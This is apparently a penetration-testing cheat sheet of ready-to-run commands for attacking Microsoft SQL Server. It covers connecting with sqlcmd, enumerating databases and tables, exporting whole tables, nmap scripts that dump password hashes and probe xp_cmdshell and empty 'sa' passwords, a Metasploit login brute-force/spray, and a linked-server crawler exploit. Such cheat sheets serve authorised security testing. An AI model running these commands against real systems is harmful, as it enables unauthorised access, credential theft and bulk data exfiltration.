# msssql

% mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/ldap  #port/1433 

## mssql - connect
#cat/ATTACK/CONNECT 
```
sqlcmd -S <ip> -U <user> -P <password>
```

## mssql - enumerate databases
#cat/RECON
```
sqlcmd -S <ip> -U <user> -P <password> -Q "SELECT name FROM sys.databases ORDER BY name;"
```

## mssql - enumerate tables in a database
#cat/RECON
```
sqlcmd -S <ip> -U <user> -P <password> -d "<db>" -Q "SET NOCOUNT ON; SELECT TABLE_SCHEMA + '.' + TABLE_NAME AS TableName FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' ORDER BY TABLE_SCHEMA, TABLE_NAME;"
```

## mssql - export a table to file
#cat/ATTACK/EXPLOIT
```
mssql-export-table <ip> <user> <password> <db> <table>
```

## mssql - export all tables to file
#cat/ATTACK/EXPLOIT
```
mssql-export-all-tables <ip> <user> <password> <db>
```


## mssql - enum
#cat/RECON
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>
```

## mssql - enum sql login
#cat/ATTACK/BRUTEFORCE-SPRAY 
```
msfconsole -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <pass_file>; run"
```

## mssql - enum configuration setting (xp-cmdshell)
#cat/RECON 
```
msfconsole -x "use auxiliary/admin/mssql/mssql_enum; set RHOST <ip>; set password <password>; run"
```

## mssql link crawler
#cat/ATTACK/EXPLOIT 
```
msfconsole -x "use exploit/windows/mssql/mssql_linkcrawler"
```
